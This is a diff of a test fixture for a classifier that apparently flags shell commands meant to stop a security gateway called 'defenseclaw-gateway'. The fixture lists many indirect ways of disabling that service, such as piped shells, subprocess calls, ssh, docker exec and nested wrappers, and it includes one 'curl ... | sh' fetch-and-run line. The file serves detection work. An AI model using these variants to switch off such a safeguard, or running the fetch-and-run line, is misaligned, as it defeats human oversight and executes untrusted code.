@@ -253,16 +253,16 @@
 {"id": "g596r2-k155", "dialect": "", "command": "cd /tmp && defenseclaw-gateway stop", "want": "stop"}
 {"id": "g596r2-k156", "dialect": "", "command": "defenseclaw-gateway stop >/dev/null 2>&1", "want": "stop"}
 {"id": "g596r2-k157", "dialect": "", "command": "defenseclaw-gateway stop; echo done", "want": "stop"}
-{"id": "g596r2-k158", "dialect": "", "command": "echo 'defenseclaw-gateway stop' | sh", "want": "unproven"}
-{"id": "g596r2-k159", "dialect": "", "command": "echo 'defenseclaw-gateway stop' | bash", "want": "unproven"}
-{"id": "g596r2-k160", "dialect": "", "command": "bash <<< 'defenseclaw-gateway stop'", "want": "unproven"}
+{"id": "g596r2-k158", "dialect": "", "command": "echo 'defenseclaw-gateway stop' | sh", "want": "stop"}
+{"id": "g596r2-k159", "dialect": "", "command": "echo 'defenseclaw-gateway stop' | bash", "want": "stop"}
+{"id": "g596r2-k160", "dialect": "", "command": "bash <<< 'defenseclaw-gateway stop'", "want": "stop"}
 {"id": "g596r2-k161", "dialect": "", "command": "python3 -c \"import os; os.system('defenseclaw-gateway stop')\"", "want": "unproven"}
 {"id": "g596r2-k162", "dialect": "", "command": "python3 -c \"import subprocess; subprocess.run(['defenseclaw-gateway','stop'])\"", "want": "unproven"}
 {"id": "g596r2-k163", "dialect": "", "command": "node -e \"require('child_process').execSync('defenseclaw-gateway stop')\"", "want": "unproven"}
 {"id": "g596r2-k164", "dialect": "", "command": "ssh localhost 'defenseclaw-gateway stop'", "want": "unproven"}
-{"id": "g596r2-k165", "dialect": "", "command": "docker exec ctr defenseclaw-gateway stop", "want": "unproven"}
+{"id": "g596r2-k165", "dialect": "", "command": "docker exec ctr defenseclaw-gateway stop", "want": ""}
 {"id": "g596r2-k166", "dialect": "", "command": "watch -n1 defenseclaw-gateway stop", "want": "stop"}
-{"id": "g596r2-k167", "dialect": "", "command": "at now <<< 'defenseclaw-gateway stop'", "want": "unproven"}
+{"id": "g596r2-k167", "dialect": "", "command": "at now <<< 'defenseclaw-gateway stop'", "want": "stop"}
 {"id": "g596r2-k168", "dialect": "", "command": "script -qc 'defenseclaw-gateway stop' /dev/null", "want": "stop"}
 {"id": "g596r2-k169", "dialect": "", "command": "powershell -Command \"Stop-Service DefenseClawGateway\"", "want": "stop"}
 {"id": "g596r2-k170", "dialect": "", "command": "powershell -NoProfile -Command Stop-Service DefenseClawGateway", "want": "stop"}
@@ -305,7 +305,7 @@
 {"id": "g596r2-k207", "dialect": "", "command": "alias dg=defenseclaw-gateway; dg stop", "want": "stop"}
 {"id": "g596r2-k208", "dialect": "", "command": "curl -s http://x/y.sh | sh", "want": ""}
 {"id": "g596r2-k209", "dialect": "", "command": "defenseclaw gateway $(echo stop)", "want": "unproven"}
-{"id": "g596r2-k210", "dialect": "", "command": "sh <<EOF\ndefenseclaw-gateway stop\nEOF", "want": "unproven"}
+{"id": "g596r2-k210", "dialect": "", "command": "sh <<EOF\ndefenseclaw-gateway stop\nEOF", "want": "stop"}
 {"id": "g596r2-k211", "dialect": "", "command": "defenseclaw skill disable foo", "want": ""}
 {"id": "g596r2-k212", "dialect": "", "command": "defenseclaw plugin disable x", "want": ""}
 {"id": "g596r2-k213", "dialect": "", "command": "defenseclaw setup webhook disable", "want": ""}
@@ -319,7 +319,7 @@
 {"id": "g596r2-k221", "dialect": "", "command": "systemctl stop \"defenseclaw-*.service\"", "want": "stop"}
 {"id": "g596r2-k222", "dialect": "", "command": "sudo -E systemctl stop defenseclaw-gateway", "want": "stop"}
 {"id": "g596r2-k223", "dialect": "", "command": "sudo nice nohup env A=1 timeout 5 defenseclaw-gateway stop", "want": "stop"}
-{"id": "g596r2-k224", "dialect": "", "command": "((((((((((((((((((((((((((((((defenseclaw-gateway stop))))))))))))))))))))))))))))))", "want": "unproven"}
+{"id": "g596r2-k224", "dialect": "", "command": "((((((((((((((((((((((((((((((defenseclaw-gateway stop))))))))))))))))))))))))))))))", "want": ""}
 {"id": "g596r2-k225", "dialect": "", "command": "sudo sudo sudo sudo sudo defenseclaw-gateway stop", "want": "stop"}
 {"id": "g596r2-k226", "dialect": "", "command": "env env env env env defenseclaw-gateway stop", "want": "stop"}
 {"id": "g596r2-k227", "dialect": "", "command": "bash -c 'bash -c \"bash -c \\\"defenseclaw-gateway stop\\\"\"'", "want": "stop"}
